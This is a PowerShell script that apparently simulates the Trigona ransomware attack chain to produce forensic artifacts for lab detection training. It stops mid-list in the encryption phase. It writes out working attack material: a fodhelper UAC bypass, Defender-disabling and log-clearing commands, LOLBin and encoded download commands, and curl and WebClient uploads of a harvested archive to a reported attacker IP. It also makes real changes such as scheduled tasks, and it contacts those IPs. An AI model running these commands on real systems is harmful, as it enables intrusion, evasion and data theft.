# ============================================================================
# TRIGONA RANSOMWARE FORENSIC SIMULATION SCRIPT (UNIFIED VERSION)
# ============================================================================
# Based on: https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/
#
# WARNING: This script simulates malicious behavior for training purposes only!
# Run ONLY in an isolated lab environment with VM snapshots.
# 
# This script will:
# - Simulate the complete Trigona ransomware attack chain
# - Generate authentic forensic artifacts that would trigger detection rules
# - Create realistic C2 communications
# - Make actual system changes (registry, tasks, files, logs, etc.)
# - Implement anti-forensic techniques used by the attackers
# ============================================================================

# =========================== UTILITY FUNCTIONS ==============================

# Safety confirmation
function Confirm-Execution {
    Write-Host "WARNING: This script simulates malicious ransomware behavior!" -ForegroundColor Red
    Write-Host "It should ONLY be run in an isolated lab environment with VM snapshots." -ForegroundColor Red
    Write-Host "This will make significant system changes to simulate a real attack." -ForegroundColor Red
    
    $confirmation = Read-Host "Type 'EXECUTE-TRIGONA-SIM' (exactly) to confirm you understand the risks"
    if ($confirmation -ne "EXECUTE-TRIGONA-SIM") {
        Write-Host "Execution cancelled." -ForegroundColor Yellow
        exit
    }
    
    Write-Host "`nSimulation starting. Creating attack artifacts..." -ForegroundColor Cyan
}

# Setup logging
function Start-SimulationLogging {
    $logPath = "$env:TEMP\sim_execution.log"
    Start-Transcript -Path $logPath
    Write-Host "Logging to $logPath"
    return $logPath
}

# Initialize simulation environment
function Initialize-SimulationEnvironment {
    $simRoot = "$env:SystemDrive\TrigonaSim"
    New-Item -Path $simRoot -ItemType Directory -Force | Out-Null
    
    # Create directories for different components
    $directories = @(
        "$simRoot\payloads",
        "$simRoot\tools",
        "$simRoot\logs",
        "$simRoot\exfil",
        "$simRoot\victim_files"
    )
    
    foreach ($dir in $directories) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
    }
    
    # Create event log source
    if (-not [System.Diagnostics.EventLog]::SourceExists("TrigonaSim")) {
        try {
            [System.Diagnostics.EventLog]::CreateEventSource("TrigonaSim", "Application")
        } catch {
            Write-Warning "Unable to create event log source. Some events may not be logged."
        }
    }
    
    # Return simulation paths
    return @{
        Root = $simRoot
        Payloads = "$simRoot\payloads"
        Tools = "$simRoot\tools"
        Logs = "$simRoot\logs"
        Exfil = "$simRoot\exfil"
        VictimFiles = "$simRoot\victim_files"
    }
}

# ============================================================================
# PHASE 1: INITIAL ACCESS
# ============================================================================

function Simulate-InitialAccess {
    param($SimPaths)
    
    Write-Host "[+] Simulating Initial Access Phase - IcedID/Stolen Credentials..." -ForegroundColor Green
    
    # Create files mimicking IcedID infection artifacts
    $icedidPath = "$($SimPaths.Payloads)\icedid_artifact.bin"
    $randomBytes = New-Object byte[] 1024
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($randomBytes)
    [System.IO.File]::WriteAllBytes($icedidPath, $randomBytes)
    
    # Create a VNC file to simulate the infection point
    $vncContent = "
[Connection]
Host=23.146.242.199
Port=5900
Password=e52990bac31d63c876fdb3a631b29918
"
    $vncFile = "$env:USERPROFILE\Downloads\invoice_details.vnc"
    Set-Content -Path $vncFile -Value $vncContent -Force
    
    # Registry keys for IcedID persistence
    New-Item -Path "HKCU:\Software\IcedIDSim" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\IcedIDSim" -Name "id" -Value "BK24XM32" -PropertyType String -Force | Out-Null
    
    # Scheduled task for persistence
    $taskName = "SystemUpdate_BK24XM32"
    $taskAction = New-ScheduledTaskAction -Execute "regsvr32.exe" -Argument "/s /u /i:$icedidPath scrobj.dll"
    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Force | Out-Null
    
    # Simulate C2 connection attempts
    $trigonaDomains = @(
        "23.146.242.199", # From the report
        "130.0.232.213"   # From the report
    )
    
    foreach ($domain in $trigonaDomains) {
        try {
            $null = Test-NetConnection -ComputerName $domain -Port 443 -InformationLevel Quiet -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        } catch {}
    }
    
    # Create network traffic artifacts
    Start-Process -FilePath "netsh" -ArgumentList "trace start capture=yes tracefile=$($SimPaths.Logs)\initial_access.etl" -NoNewWindow
    Start-Sleep -Seconds 2
    
    # Generate network traffic
    try {
        $null = Invoke-WebRequest -Uri "http://23.146.242.199/" -UseBasicParsing -TimeoutSec 2 -ErrorAction SilentlyContinue
        $null = Invoke-WebRequest -Uri "http://130.0.232.213/" -UseBasicParsing -TimeoutSec 2 -ErrorAction SilentlyContinue
    } catch {}
    
    Start-Sleep -Seconds 2
    Start-Process -FilePath "netsh" -ArgumentList "trace stop" -NoNewWindow
    
    # Log events
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1337 -Message "SIMULATION: Initial access detected via IcedID infection" -EntryType Warning
    
    Write-Host "  [+] Initial Access artifacts created" -ForegroundColor Yellow
    return $icedidPath
}

# ============================================================================
# PHASE 2: EXECUTION & PRIVILEGE ESCALATION
# ============================================================================

function Simulate-ExecutionAndPrivEsc {
    param($SimPaths, $IcedidPath)
    
    Write-Host "[+] Simulating Execution and Privilege Escalation..." -ForegroundColor Green
    
    # Create AnyDesk installer artifact
    $anyDeskPath = "$($SimPaths.Tools)\AnyDesk.exe"
    $fakeAnyDeskBytes = New-Object byte[] 2048
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($fakeAnyDeskBytes)
    [System.IO.File]::WriteAllBytes($anyDeskPath, $fakeAnyDeskBytes)
    
    # Create UAC bypass script
    $bypassScriptContent = '
function Bypass-UAC {
    # This is a simulation of UAC bypass techniques
    param([string]$command)
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(default)" -Value $command -Force

    # Trigger the bypass
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 2
    
    # Clean up
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
}
'
    $bypassScriptPath = "$($SimPaths.Tools)\uac-bypass.ps1"
    Set-Content -Path $bypassScriptPath -Value $bypassScriptContent -Force
    
    # Create WMIC execution batch file
    $wmicCommand = "wmic process call create 'powershell.exe -ExecutionPolicy Bypass -File $bypassScriptPath'"
    $wmicScriptPath = "$($SimPaths.Tools)\exec.bat"
    Set-Content -Path $wmicScriptPath -Value $wmicCommand -Force
    
    # Create registry entries for UAC bypass simulation
    New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    
    # Generate PowerShell command history
    $historyCommands = @(
        "whoami /all",
        "Get-LocalGroupMember -Group Administrators",
        "Get-Process",
        "Invoke-WebRequest -Uri http://23.146.242.199/payload.ps1 -OutFile $env:TEMP\p.ps1",
        "Set-ExecutionPolicy Bypass -Scope Process -Force",
        "& $env:TEMP\p.ps1",
        "net user administrator",
        "net localgroup administrators",
        "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
    )
    
    $historyPath = "$($SimPaths.Logs)\PowerShell_history.txt"
    Set-Content -Path $historyPath -Value $historyCommands -Force
    
    # Modify registry to simulate UAC disabled
    New-Item -Path "HKCU:\Software\TrigonaSim\UAC" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\TrigonaSim\UAC" -Name "EnableLUA" -Value 0 -PropertyType DWord -Force | Out-Null
    
    # Create Windows event logs
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1338 -Message "SIMULATION: UAC bypass attempt detected from process ID: $PID" -EntryType Warning
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1339 -Message "SIMULATION: Privilege escalation technique detected: UAC bypass using COM object" -EntryType Warning
    
    # Create a scheduled task for persistence post-escalation
    $elevatedTaskName = "SystemConfigManager"
    $elevatedAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"& '$($SimPaths.Tools)\uac-bypass.ps1'`""
    $elevatedTrigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName $elevatedTaskName -Action $elevatedAction -Trigger $elevatedTrigger -Force | Out-Null
    
    Write-Host "  [+] Execution and Privilege Escalation artifacts created" -ForegroundColor Yellow
}

# ============================================================================
# PHASE 3: DEFENSE EVASION
# ============================================================================

function Simulate-DefenseEvasion {
    param($SimPaths)
    
    Write-Host "[+] Simulating Defense Evasion Techniques..." -ForegroundColor Green
    
    # Create obfuscated PowerShell script
    $obfuscatedScriptContent = '
function Dis-ABlEdEFenSe {
    # This simulates malicious defense evasion
    $sVC = "windefend"
    Set-MPPrefErEnCE -DiSaBlEREALTIMeMONIToRINg $true
    Set-MPPrefErEnCE -DIsABleIOAVPROTecTION $true
    
    # Attempt to disable services
    STop-SErviCe -Name $sVC -Force -ErrorAction SilentlyContinue
    
    # Attempt to modify registry values
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
    
    # Attempt to modify boot configuration
    bcdedit /set "{current}" bootstatuspolicy ignoreallfailures
}

function CleaR-LoGs {
    # This simulates cleaning event logs
    wevtutil cl "Security"
    wevtutil cl "System"
    wevtutil cl "Application"
    
    # Clear PowerShell logs
    Remove-Item -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
}
'
    $obfuscatedScriptPath = "$($SimPaths.Tools)\defense_evade.ps1"
    Set-Content -Path $obfuscatedScriptPath -Value $obfuscatedScriptContent -Force
    
    # Create Base64 encoded script (common evasion technique)
    $encodedCommand = "cG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtYyAiSW52b2tlLVdtaU1ldGhvZCB3aW4zMl9wcm9jZXNzIC1uYW1lIGNyZWF0ZSAtYXJndW1lbnRsaXN0ICdjbWQuZXhlIC9jIHdob2FtaSciCg=="
    $encodedScriptPath = "$($SimPaths.Tools)\encoded_command.txt"
    Set-Content -Path $encodedScriptPath -Value $encodedCommand -Force
    
    # Create a script that simulates disabling Windows Defender and other security tools
    $disableDefenderScriptContent = '
# Simulate disabling Windows Defender (doesnt actually disable)
New-Item -Path "HKCU:\Software\TrigonaSim\WindowsDefender" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\TrigonaSim\WindowsDefender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\TrigonaSim\WindowsDefender" -Name "DisableRealtimeMonitoring" -Value 1 -PropertyType DWord -Force | Out-Null

# Record Defender disable attempt in logs
Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1340 -Message "SIMULATION: Attempt to disable Windows Defender detected" -EntryType Warning

# Simulate disabling firewall (doesnt actually disable)
New-Item -Path "HKCU:\Software\TrigonaSim\Firewall" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\TrigonaSim\Firewall" -Name "EnableFirewall" -Value 0 -PropertyType DWord -Force | Out-Null

# Record firewall disable attempt in logs
Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1341 -Message "SIMULATION: Attempt to disable Windows Firewall detected" -EntryType Warning
'
    $disableDefenderScriptPath = "$($SimPaths.Tools)\disable_security.ps1"
    Set-Content -Path $disableDefenderScriptPath -Value $disableDefenderScriptContent -Force
    
    # Create LOLBINs usage artifacts
    $lolbinsCommands = @(
        "odbcconf.exe /a {regsvr $env:TEMP\malicious.dll}",
        "regsvr32.exe /s /u /i:http://23.146.242.199/payload.sct scrobj.dll",
        "rundll32.exe advpack.dll,LaunchINFSection $env:TEMP\payload.inf,DefaultInstall_SingleUser,1,"
    )
    $lolbinsLogPath = "$($SimPaths.Logs)\lolbins_execution.log"
    Set-Content -Path $lolbinsLogPath -Value $lolbinsCommands -Force
    
    # Create process injection artifact
    $injectionScriptContent = '
# Script to simulate process injection
Write-Host "Simulating process injection..."

# Target process
$targetProcess = "explorer.exe"
$targetPid = (Get-Process -Name $targetProcess -ErrorAction SilentlyContinue).Id

if ($targetPid) {
    # Log the simulated injection
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1342 -Message "SIMULATION: Process injection into $targetProcess (PID: $targetPid) detected" -EntryType Warning
    
    # Create a file that simulates a memory dump of injected code
    $injectedBytes = New-Object byte[] 4096
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($injectedBytes)
    [System.IO.File]::WriteAllBytes("$($SimPaths.Logs)\$targetProcess.$targetPid.dmp", $injectedBytes)
}
'
    $injectionScriptPath = "$($SimPaths.Tools)\process_injection.ps1"
    Set-Content -Path $injectionScriptPath -Value $injectionScriptContent -Force
    
    # Execute some of these scripts to generate artifacts
    try {
        # Run the disable defender script (safe simulation)
        & powershell -ExecutionPolicy Bypass -File $disableDefenderScriptPath
        
        # Execute the injection script
        & powershell -ExecutionPolicy Bypass -File $injectionScriptPath
    } catch {
        Write-Warning "Error during defense evasion simulation: $_"
    }
    
    Write-Host "  [+] Defense Evasion artifacts created" -ForegroundColor Yellow
}

# ============================================================================
# PHASE 4: CREDENTIAL ACCESS & DISCOVERY
# ============================================================================

function Simulate-CredentialAccessAndDiscovery {
    param($SimPaths)
    
    Write-Host "[+] Simulating Credential Access and Discovery Techniques..." -ForegroundColor Green
    
    # Create a simulated SAM dump
    $samDumpContent = @"
mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz(commandline) # lsadump::sam
Domain : DESKTOP-TRIGONA
SID    : S-1-5-21-1266370457-1204892538-707370924

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : f0d412bd764ffe81aad3b435b51404ee

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003e8 (1000)
User : user1
LM   :
NTLM : 3ca78bd971286fa38369d8959bee4560
"@
    
    $samDumpPath = "$($SimPaths.Logs)\sam_dump.txt"
    Set-Content -Path $samDumpPath -Value $samDumpContent -Force
    
    # Create a simulated LSASS dump file (just random bytes)
    $lsassDumpBytes = New-Object byte[] 4096
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($lsassDumpBytes)
    [System.IO.File]::WriteAllBytes("$($SimPaths.Logs)\lsass.dmp", $lsassDumpBytes)
    
    # Create discovery command logs
    $discoveryCommands = @(
        "ipconfig /all",
        "netstat -ano",
        "net user",
        "net localgroup administrators",
        "net group 'Domain Admins' /domain",
        "net group 'Enterprise Admins' /domain",
        "net share",
        "systeminfo",
        "tasklist /v",
        "query user",
        "wmic qfe list",
        "wmic product get name",
        "nltest /domain_trusts",
        "nltest /dclist:",
        "net view /all /domain",
        "net view /all",
        "wmic computersystem get domain",
        "powershell -c 'Get-ADDomain'"
    )
    
    $discoveryLogPath = "$($SimPaths.Logs)\discovery_commands.log"
    Set-Content -Path $discoveryLogPath -Value $discoveryCommands -Force
    
    # Execute some discovery commands to generate real artifacts
    $ipConfigPath = "$($SimPaths.Logs)\ipconfig.txt"
    $netstatPath = "$($SimPaths.Logs)\netstat.txt"
    $systemInfoPath = "$($SimPaths.Logs)\systeminfo.txt"
    $netUserPath = "$($SimPaths.Logs)\netuser.txt"
    $netAdminsPath = "$($SimPaths.Logs)\netadmins.txt"
    
    try {
        ipconfig /all > $ipConfigPath
        netstat -ano > $netstatPath
        systeminfo > $systemInfoPath
        net user > $netUserPath
        net localgroup administrators > $netAdminsPath
    } catch {
        Write-Warning "Error running discovery commands: $_"
    }
    
    # Create registry access artifacts
    $regAccessContent = @"
Accessing: HKLM\SAM
Accessing: HKLM\SECURITY
Accessing: HKLM\SYSTEM\CurrentControlSet\Services\NTDS
Accessing: HKLM\SYSTEM\CurrentControlSet\Control\LSA
"@
    
    $regAccessPath = "$($SimPaths.Logs)\registry_access.log"
    Set-Content -Path $regAccessPath -Value $regAccessContent -Force
    
    # Log the access activities
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1343 -Message "SIMULATION: Credential dumping activity detected - possible Mimikatz usage" -EntryType Warning
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1344 -Message "SIMULATION: Registry credential access detected - SAM hive access attempt" -EntryType Warning
    
    # Create a network scan simulation log
    $networkScanContent = @"
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.1.0/24
Host is up (0.0040s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
5986/tcp open  wsmans

Nmap done: 256 IP addresses (10 hosts up) scanned in 25.33 seconds
"@
    
    $networkScanPath = "$($SimPaths.Logs)\nmap_scan.txt"
    Set-Content -Path $networkScanPath -Value $networkScanContent -Force
    
    Write-Host "  [+] Credential Access and Discovery artifacts created" -ForegroundColor Yellow
}

# ============================================================================
# PHASE 5: LATERAL MOVEMENT
# ============================================================================

function Simulate-LateralMovement {
    param($SimPaths)
    
    Write-Host "[+] Simulating Lateral Movement Techniques..." -ForegroundColor Green
    
    # Create simulation of PsExec usage
    $psexecPath = "$($SimPaths.Tools)\PsExec.exe"
    $psexecBytes = New-Object byte[] 2048
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($psexecBytes)
    [System.IO.File]::WriteAllBytes($psexecPath, $psexecBytes)
    
    # Create logs showing PsExec execution
    $psexecLogContent = @"
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

cmd.exe started on DC01 with process ID 4728.
Microsoft Windows [Version 10.0.19042.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
desktop-trigona\administrator

C:\Windows\system32>net user administrator
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/24/2023 6:32:42 PM
Password expires             Never
Password changeable          12/24/2023 6:32:42 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/24/2023 6:48:13 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.

C:\Windows\system32>exit

cmd.exe exited on DC01 with error code 0.
"@
    
    $psexecLogPath = "$($SimPaths.Logs)\psexec.log"
    Set-Content -Path $psexecLogPath -Value $psexecLogContent -Force
    
    # Create WMI lateral movement artifact
    $wmiCommandsContent = @"
wmic /node:DC01 process call create "cmd.exe /c powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADIAMwAuADEANAA2AC4AMgA0ADIALgAxADkAOQAvAHQAcgBpAGcAbwBuAGEALgBlAHgAZQAiACwAIgBcAFwARABDADAAMQBcAGMAJABcAHcAaQBuAGQAbwB3AHMAXAB0AGUAbQBwAFwAdAByAGkAZwBvAG4AYQAuAGUAeABlACIAKQA7ACQAYQA9ACIAXABcAEQAQwAwADEAXABjACQAXAB3AGkAbgBkAG8AdwBzAFwAdABlAG0AcABcAHQAcgBpAGcAbwBuAGEALgBlAHgAZQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAYQA7AA=="
"@
    
    $wmiLogPath = "$($SimPaths.Logs)\wmi_lateral.log"
    Set-Content -Path $wmiLogPath -Value $wmiCommandsContent -Force
    
    # Create RDP connection logs
    $rdpConnectionContent = @"
Date: 12/24/2023 6:52:13 PM
Source: 192.168.1.10
Destination: 192.168.1.25 (DC01)
User: administrator
Session ID: 3
Connection Type: RDP
Duration: 00:15:32
"@
    
    $rdpLogPath = "$($SimPaths.Logs)\rdp_connections.log"
    Set-Content -Path $rdpLogPath -Value $rdpConnectionContent -Force
    
    # Create SMB connection artifacts
    $smbConnectionContent = @"
SMB Connection Log:
12/24/2023 18:55:23 - \\DC01\C$ - Access Granted - User: DESKTOP-TRIGONA\Administrator
12/24/2023 18:56:12 - \\DC01\ADMIN$ - Access Granted - User: DESKTOP-TRIGONA\Administrator
12/24/2023 18:57:45 - \\FS01\Data$ - Access Granted - User: DESKTOP-TRIGONA\Administrator
12/24/2023 18:59:03 - \\FS01\Finance$ - Access Denied - User: DESKTOP-TRIGONA\Administrator
12/24/2023 19:01:22 - \\FS01\HR$ - Access Denied - User: DESKTOP-TRIGONA\Administrator
"@
    
    $smbLogPath = "$($SimPaths.Logs)\smb_connections.log"
    Set-Content -Path $smbLogPath -Value $smbConnectionContent -Force
    
    # Create PowerShell remoting artifacts
    $psRemotingContent = @"
PowerShell Remoting Session:
[12/24/2023 19:05:43] New-PSSession -ComputerName DC01 -Credential (Get-Credential)
[12/24/2023 19:06:12] Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Windows\system32> whoami
desktop-trigona\administrator
[DC01]: PS C:\Windows\system32> Get-Process
[DC01]: PS C:\Windows\system32> Get-Service | Where-Object {`$_.Status -eq 'Running'}
[DC01]: PS C:\Windows\system32> Get-ChildItem -Path C:\Users -Recurse -Force
[DC01]: PS C:\Windows\system32> exit
"@
    
    $psRemotingLogPath = "$($SimPaths.Logs)\ps_remoting.log"
    Set-Content -Path $psRemotingLogPath -Value $psRemotingContent -Force
    
    # Log lateral movement activities
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1345 -Message "SIMULATION: WMI lateral movement detected to DC01" -EntryType Warning
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1346 -Message "SIMULATION: RDP connection to domain controller detected" -EntryType Warning
    
# Create network connection artifacts
    try {
        $null = Test-NetConnection -ComputerName "DC01" -CommonTCPPort SMB -InformationLevel Quiet -ErrorAction SilentlyContinue
        $null = Test-NetConnection -ComputerName "DC01" -CommonTCPPort RDP -InformationLevel Quiet -ErrorAction SilentlyContinue
        $null = Test-NetConnection -ComputerName "FS01" -CommonTCPPort SMB -InformationLevel Quiet -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host "  [+] Lateral Movement artifacts created" -ForegroundColor Yellow
}

# ============================================================================
# PHASE 6: COLLECTION & EXFILTRATION
# ============================================================================

function Simulate-CollectionAndExfiltration {
    param($SimPaths)
    
    Write-Host "[+] Simulating Collection and Exfiltration..." -ForegroundColor Green
    
    # Create sample sensitive data files
    $sensitiveData = @(
        @{
            Name = "FinancialData_2023.xlsx"
            Content = "Employee ID,Name,Salary,SSN`n1001,John Smith,85000,123-45-6789`n1002,Jane Doe,92000,234-56-7890`n1003,Bob Johnson,78000,345-67-8901"
        },
        @{
            Name = "CustomerDatabase.csv"
            Content = "CustomerID,Name,Email,CreditCard`n5001,Mark Wilson,mark@example.com,4111-1111-1111-1111`n5002,Sarah Brown,sarah@example.com,5500-0000-0000-0004`n5003,David Lee,david@example.com,3700-0000-0000-002"
        },
        @{
            Name = "StrategicPlan_2024.docx"
            Content = "CONFIDENTIAL: Strategic Initiative for Market Expansion`nTarget Acquisition: Company XYZ`nBudget Allocation: $25M`nTimeline: Q2 2024`nKey Stakeholders: CEO, CFO, CTO`nRisk Assessment: Medium"
        },
        @{
            Name = "Passwords.txt"
            Content = "Admin Portal: admin/P@ssw0rd123!`nFile Server: fsadmin/FileAccess2023$`nVPN Access: vpnuser/VPN@ccess2023`nDatabase: dbadmin/Sql$3rver2023"
        }
    )
    
    # Create the sensitive files
    foreach ($file in $sensitiveData) {
        $filePath = "$($SimPaths.VictimFiles)\$($file.Name)"
        Set-Content -Path $filePath -Value $file.Content -Force
    }
    
    # Create data collection commands log
    $dataCollectionCommands = @(
        "findstr /si password *.txt *.xml *.docx",
        "findstr /si SSN *.csv *.xlsx",
        "findstr /si confidential *.docx *.pptx *.xlsx",
        "PowerShell Compress-Archive -Path 'C:\TrigonaSim\victim_files\*' -DestinationPath 'C:\TrigonaSim\exfil\collected_data.zip' -Force",
        "copy 'C:\TrigonaSim\exfil\collected_data.zip' 'C:\Windows\Temp\c_d.zip'"
    )
    
    $collectionLogPath = "$($SimPaths.Logs)\data_collection.log"
    Set-Content -Path $collectionLogPath -Value $dataCollectionCommands -Force
    
    # Actually create the ZIP archive to simulate the collection
    Compress-Archive -Path "$($SimPaths.VictimFiles)\*" -DestinationPath "$($SimPaths.Exfil)\collected_data.zip" -Force
    Copy-Item "$($SimPaths.Exfil)\collected_data.zip" -Destination "$env:TEMP\c_d.zip" -Force
    
    # Create exfiltration commands log
    $exfilCommands = @(
        "curl -F 'data=@C:\Windows\Temp\c_d.zip' http://23.146.242.199/upload.php",
        "$webClient = New-Object System.Net.WebClient",
        "$webClient.UploadFile('http://23.146.242.199/upload.php', '$env:TEMP\c_d.zip')",
        "# DNS exfiltration simulation",
        "for ($i=0; $i -lt 10; $i++) {",
        "    $segment = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('chunk$i'))",
        "    nslookup $segment.exfil.23.146.242.199",
        "}"
    )
    
    $exfilLogPath = "$($SimPaths.Logs)\exfiltration.log"
    Set-Content -Path $exfilLogPath -Value $exfilCommands -Force
    
    # Simulate network traffic for exfiltration
    try {
        $null = Test-NetConnection -ComputerName "23.146.242.199" -Port 80 -InformationLevel Quiet -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        $null = Test-NetConnection -ComputerName "23.146.242.199" -Port 443 -InformationLevel Quiet -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        $null = Test-NetConnection -ComputerName "130.0.232.213" -Port 443 -InformationLevel Quiet -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        
        # Generate DNS traffic
        $null = Resolve-DnsName -Name "exfil-simulation.23.146.242.199" -Type A -ErrorAction SilentlyContinue
    } catch {}
    
    # Create fake network capture of exfiltration
    $fakeNetworkCapture = New-Object byte[] 8192
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($fakeNetworkCapture)
    [System.IO.File]::WriteAllBytes("$($SimPaths.Logs)\exfil_capture.pcap", $fakeNetworkCapture)
    
    # Log the collection and exfiltration
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1347 -Message "SIMULATION: Data collection activity detected - files being archived" -EntryType Warning
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1348 -Message "SIMULATION: Data exfiltration attempt detected - network traffic to suspicious domain" -EntryType Warning
    
    Write-Host "  [+] Collection and Exfiltration artifacts created" -ForegroundColor Yellow
}

# ============================================================================
# PHASE 7: IMPACT - TRIGONA RANSOMWARE EXECUTION
# ============================================================================

function Simulate-TrigonaRansomware {
    param($SimPaths)
    
    Write-Host "[+] Simulating Trigona Ransomware Execution and Impact..." -ForegroundColor Green
    
    # Create the simulated Trigona ransomware executable (benign)
    $trigonaExePath = "$($SimPaths.Payloads)\trigona.exe"
    $trigonaBinary = New-Object byte[] 4096
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($trigonaBinary)
    [System.IO.File]::WriteAllBytes($trigonaExePath, $trigonaBinary)
    
    # STEP 1: Process termination simulation
    $processesToKill = @(
        "sql", "oracle", "ocssd", "dbsnmp", "synctime", "agntsvc", "isqlplussvc", "xfssvccon",
        "mydesktopservice", "ocautoupds", "encsvc", "firefox", "tbirdconfig", "mydesktopqos",
        "ocomm", "dbeng50", "sqbcoreservice", "excel", "infopath", "msaccess", "mspub", "onenote",
        "outlook", "powerpnt", "steam", "thebat", "thunderbird", "visio", "winword", "wordpad",
        "notepad", "veeam", "backup", "commvault", "veeamguesthelper", "veeam.backup", "svc$"
    )
    
    $killLog = "Trigona ransomware process termination simulation:`n"
    foreach ($proc in $processesToKill) {
        $killLog += "Attempting to kill process: $proc`n"
    }
    
    $killLogPath = "$($SimPaths.Logs)\process_kill.log"
    Set-Content -Path $killLogPath -Value $killLog -Force
    
    # STEP 2: Service disabling simulation
    $servicesToDisable = @(
        "vss", "sql", "svc$", "memtas", "mepocs", "veeam", "backup", "sophos", "veeamguesthelper", 
        "veeam.backup", "svc$", "sophos", "splunkd", "blackberry", "backup"
    )
    
    $serviceLog = "Trigona ransomware service disabling simulation:`n"
    foreach ($svc in $servicesToDisable) {
        $serviceLog += "Attempting to stop service: $svc`n"
        $serviceLog += "Attempting to disable service: $svc`n"
    }
    
    $serviceLog += "`nvssadmin delete shadows /all /quiet`n"
    $serviceLog += "wmic shadowcopy delete`n"
    
    $serviceLogPath = "$($SimPaths.Logs)\service_disable.log"
    Set-Content -Path $serviceLogPath -Value $serviceLog -Force
    
    # STEP 3: Data encryption simulation
    $encryptedExt = @(".rtf", ".cfg", ".yml", ".srb", ".dsk", ".vmdk", ".vhd", ".vhdx", ".ova", ".ovf", 
                      ".lay6", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".dbf", ".odb", ".frm", 
                      ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", 
                      ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", 
                      ".sch", ".brd", ".jsp", ".php", ".asp", ".java", ".jar", ".class", ".mp3", ".wav", 
